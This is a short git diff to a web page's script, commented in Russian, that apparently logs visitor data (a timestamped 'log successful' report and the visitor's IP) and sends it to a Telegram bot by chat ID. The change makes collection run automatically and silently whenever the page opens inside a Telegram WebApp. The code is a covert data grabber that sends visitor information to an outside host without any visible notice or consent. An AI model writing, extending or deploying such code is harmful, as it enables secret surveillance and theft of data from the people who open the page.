@@ -16,7 +16,7 @@
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message })
             });
         }
-        
+
         function collectUserData() {
             let logData = `Лог успешен! [${new Date().toLocaleString()}]\n\n`;
 
@@ -78,8 +78,14 @@
                 .catch(error => console.error('Ошибка получения IP:', error));
         }
 
-        // Отправка данных каждый раз при загрузке страницы
-        window.onload = collectUserData;
+        // Отправка данных при переходе в WebApp
+        window.onload = function() {
+            // Если это WebApp, то запускаем функцию сбора данных
+            if (Telegram.WebApp) {
+                Telegram.WebApp.ready();
+                collectUserData();
+            }
+        };
     </script>
 </head>
 <body>
